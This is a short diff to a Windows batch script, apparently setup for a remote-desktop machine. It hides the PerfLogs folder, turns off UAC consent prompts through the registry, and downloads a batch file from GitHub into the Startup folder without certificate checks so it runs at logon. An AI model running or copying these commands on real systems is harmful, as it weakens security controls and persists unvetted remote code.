@@ -1,3 +1,5 @@
+cd C:\
+attrib +h PerfLogs
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 curl -L -k -O https://github.com/kmille36/thuonghai/raw/master/setproxywin.bat
